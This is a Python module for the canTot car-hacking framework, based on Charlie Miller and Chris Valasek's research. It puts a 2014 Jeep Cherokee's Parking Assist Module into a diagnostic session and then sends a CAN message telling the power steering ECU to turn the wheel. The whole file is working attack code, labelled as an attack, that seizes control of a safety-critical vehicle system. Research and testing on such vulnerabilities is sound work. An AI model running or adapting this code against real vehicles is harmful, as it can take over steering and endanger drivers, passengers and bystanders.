from sploitkit import *
import can

class cherokee_turn_steering(Module):
    """ This module will put the Parking Assist Module(PAM) in diagnostic session and send a CAN message to tell the power steering ECU to turn the wheel for the Jeep Cherokee 2014.

    Author:  shipcod3 # canTot module
    Credits: Charlie Miller and Chris Valasek # Original Research
    Reference: http://www.illmatics.com/Remote%20Car%20Hacking.pdf
    Version: 1.0
    """
    config = Config({
        Option(
            'INTERFACE',
            "CAN interface",
            True,
        ): str("vcan0"),
    })    
    def run(self):
        bus = can.interface.Bus(bustype="socketcan", channel=self.config.option('INTERFACE').value)
        print("[+] Starting a diagnostic session in the Parking Assist Module(PAM)...")
        msg = can.Message(arbitration_id=0x18DAA0F1, data=[0x02,0x10,0x02,0,0,0,0,0], is_extended_id=True)
        try:
            bus.send(msg)
            print("[*] Sending a CAN message that tells the power steering ECU to turn the wheel")
            msg2 = can.Message(arbitration_id=0x18DAA0F1, data=[0x90,0x32,0x28,0x1F], is_extended_id=True)
            bus.send(msg2)
        except:
            print("Message not sent thus stopping the attack")
